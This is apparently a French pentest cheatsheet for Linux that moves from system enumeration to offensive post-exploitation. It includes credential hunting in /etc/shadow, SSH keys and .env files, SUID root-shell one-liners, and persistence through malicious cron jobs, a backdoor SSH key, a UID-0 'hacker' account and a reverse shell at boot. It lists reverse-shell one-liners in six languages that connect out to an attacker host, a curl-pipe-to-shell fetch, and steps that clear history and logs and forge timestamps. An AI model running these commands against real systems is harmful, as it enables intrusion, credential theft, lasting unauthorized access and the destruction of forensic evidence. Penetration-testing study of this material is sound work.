# Linux Cheatsheet

Référence rapide des commandes Linux essentielles en pentest énumération, privilèges, persistence et post-exploitation.



## Informations Système

::: code-group
```bash [Système]
# Info système
uname -a
uname -r
cat /etc/os-release
cat /etc/issue
lsb_release -a

# Hostname
hostname
hostname -f

# Uptime
uptime
last reboot
```
```bash [Matériel]
# CPU
lscpu
cat /proc/cpuinfo

# RAM
free -h
cat /proc/meminfo

# Disques
df -h
lsblk
fdisk -l
```

:::


## Utilisateurs & Groupes

::: code-group
```bash [Utilisateurs]
# Utilisateur courant
whoami
id
id <username>

# Tous les utilisateurs
cat /etc/passwd
cat /etc/passwd | cut -d: -f1

# Utilisateurs avec shell
cat /etc/passwd | grep -v /nologin | grep -v /false

# Historique de connexion
last
lastlog
w
who
```
```bash [Groupes]
# Groupes de l'utilisateur courant
groups
id

# Tous les groupes
cat /etc/group

# Membres d'un groupe
getent group <groupname>
```
```bash [Sudo]
# Droits sudo
sudo -l

# Exécuter en tant que root
sudo su
sudo -i
sudo bash

# Exécuter en tant qu'autre user
sudo -u <username> bash
```

:::


## Réseau

::: code-group
```bash [Interfaces & Routes]
# Interfaces réseau
ip a
ip addr
ifconfig

# Table de routage
ip route
route -n
netstat -rn

# ARP cache
arp -a
ip neigh

# Connexions actives
netstat -ano
ss -tunap
ss -tunlp

# Ports en écoute
netstat -tlnp
ss -tlnp
```
```bash [DNS & Ping]
# Résolution DNS
nslookup <domain>
dig <domain>
host <domain>

# Ping
ping -c 4 <target>
ping -c 1 <target>

# Traceroute
traceroute <target>
tracepath <target>
```
```bash [Scan réseau]
# Hôtes actifs
ping -c 1 192.168.1.1-254
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "bytes from"; done

# Ports ouverts (sans nmap)
nc -zv <target> 1-1024
for port in $(seq 1 1024); do nc -zv <target> $port 2>&1 | grep "succeeded"; done
```

:::

## Processus & Services

::: code-group
```bash [Processus]
# Lister les processus
ps aux
ps aux | grep <name>

# Arbre des processus
pstree
ps auxf

# Tuer un processus
kill <pid>
kill -9 <pid>
killall <name>

# Processus par port
lsof -i :<port>
fuser <port>/tcp
```
```bash [Services]
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status <service>
systemctl start <service>
systemctl stop <service>
systemctl enable <service>

# Init.d
service --status-all
service <service> status
service <service> start

# Cron jobs
crontab -l
crontab -l -u <user>
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
```

:::


## Fichiers & Répertoires

::: code-group
```bash [Navigation]
# Lister
ls -la
ls -laR
find / -name <filename> 2>/dev/null

# Fichiers récents
find / -mmin -10 2>/dev/null
find / -newer /tmp/reference 2>/dev/null

# Fichiers par taille
find / -size +10M 2>/dev/null

# Recherche contenu
grep -ri "password" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null
```
```bash [Permissions]
# Fichiers SUID
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Fichiers SGID
find / -perm -2000 2>/dev/null

# Fichiers world-writable
find / -perm -o=w -type f 2>/dev/null
find / -writable -type f 2>/dev/null

# Fichiers appartenant à root et world-writable
find / -uid 0 -perm -o=w 2>/dev/null
```
```bash [Lecture / Ecriture]
# Lire un fichier
cat /etc/passwd
less /var/log/syslog
tail -f /var/log/auth.log

# Ecrire dans un fichier
echo "text" > file.txt
echo "text" >> file.txt
tee file.txt << EOF
content
EOF
```

:::


## Credential Hunting
```bash
# Fichiers de configuration courants
cat /etc/passwd
cat /etc/shadow
cat /etc/sudoers
cat /etc/hosts

# Clés SSH
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts

# Historiques shell
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.fish_history
history

# Fichiers de config web
find /var/www -name "*.php" | xargs grep -i "password\|passwd\|db_pass" 2>/dev/null
find /var/www -name "config.php" 2>/dev/null
find /var/www -name ".env" 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null

# Bases de données
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
find / -name "*.conf" | xargs grep -i "password" 2>/dev/null

# Variables d'environnement
env
printenv
cat /proc/*/environ 2>/dev/null | tr '\0' '\n'
```


## Enumération Privilege Escalation

### Vecteurs classiques
```bash
# Sudo sans password
sudo -l

# SUID dangereux
find / -perm -4000 2>/dev/null | xargs ls -la

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs world-writable
find /etc/cron* -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null

# PATH hijacking
echo $PATH
find / -writable -type d 2>/dev/null

# NFS no_root_squash
cat /etc/exports
showmount -e localhost

# Kernel version
uname -r
searchsploit linux kernel $(uname -r)
```

### Outils automatisés
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# linux-smart-enumeration
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh -l 1
```


## Exploitation SUID
```bash
# Trouver les binaires SUID
find / -perm -4000 2>/dev/null

# Exemples courants — via GTFOBins
# bash
bash -p

# find
find . -exec /bin/bash -p \; -quit

# vim
vim -c ':py import os; os.execl("/bin/bash", "bash", "-p")'

# python
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# nmap (version ancienne)
nmap --interactive
!sh

# cp - copier /etc/shadow
cp /etc/shadow /tmp/shadow_copy
```


## Persistence

::: code-group
```bash [Cron]
# Ajouter un cron job
(crontab -l ; echo "* * * * * /tmp/evil.sh") | crontab -

# Cron system
echo "* * * * * root /tmp/evil.sh" >> /etc/crontab
echo "* * * * * root /tmp/evil.sh" > /etc/cron.d/evil
```
```bash [Backdoor SSH]
# Générer une clé SSH
ssh-keygen -t rsa -b 4096 -f /tmp/backdoor

# Ajouter la clé publique
mkdir -p ~/.ssh
echo "$(cat /tmp/backdoor.pub)" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Connexion
ssh -i /tmp/backdoor user@<target>
```
```bash [Compte root]
# Ajouter un utilisateur root
useradd -m -u 0 -o -g 0 -s /bin/bash hacker
echo "hacker:Password123!" | chpasswd

# Via /etc/passwd (si writable)
echo "hacker:$(openssl passwd -1 Password123!):0:0:root:/root:/bin/bash" >> /etc/passwd
```
```bash [Reverse shell au démarrage]
# Via rc.local
echo "/bin/bash -i >& /dev/tcp/<ATK>/4444 0>&1" >> /etc/rc.local
chmod +x /etc/rc.local

# Via systemd
cat > /etc/systemd/system/evil.service << EOF
[Unit]
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ATK>/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable evil
```

:::


## Reverse Shells

::: code-group
```bash [Bash]
bash -i >& /dev/tcp/<ATK>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<ATK>/4444 0>&1'
```
```bash [Python]
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATK>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
```bash [Netcat]
nc -e /bin/bash <ATK> 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATK> 4444 > /tmp/f
```
```bash [Perl]
perl -e 'use Socket;$i="<ATK>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```
```bash [PHP]
php -r '$sock=fsockopen("<ATK>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```
```bash [Ruby]
ruby -rsocket -e 'f=TCPSocket.open("<ATK>",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

:::


## Stabilisation du Shell
```bash
# Méthode Python TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 columns 200

# Méthode script
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm SHELL=bash

# Via socat (shell fully interactive)
# Sur l'attaquant
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Sur la cible
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATK>:4444
```


## Logs & Nettoyage
```bash
# Logs importants
cat /var/log/auth.log
cat /var/log/syslog
cat /var/log/apache2/access.log
cat /var/log/nginx/access.log

# Effacer les traces
history -c
echo "" > ~/.bash_history
unset HISTFILE

# Supprimer les logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Modifier les timestamps
touch -t 202001010000 /tmp/evil.sh
```


::: info Tips 

- Toujours vérifier `sudo -l` en premier c'est souvent le chemin le plus rapide vers root
- `find / -perm -4000 2>/dev/null` combiné avec GTFOBins couvre 80% des escalades SUID
- Ne jamais oublier de vérifier `~/.bash_history` les credentials y traînent souvent
- Les fichiers `.env` dans `/var/www` contiennent fréquemment des credentials de base de données
- Stabiliser le shell immédiatement avec Python TTY avant toute action
- Nettoyer les artefacts avant de quitter cron jobs, comptes créés, fichiers déposés

:::

## Notes
```
 # Notes terrain
```


## Ressources

- [HackTricks Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [RevShells Reverse Shell Generator](https://www.revshells.com/)




<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/cheatsheets/linux.md)</span>

</div>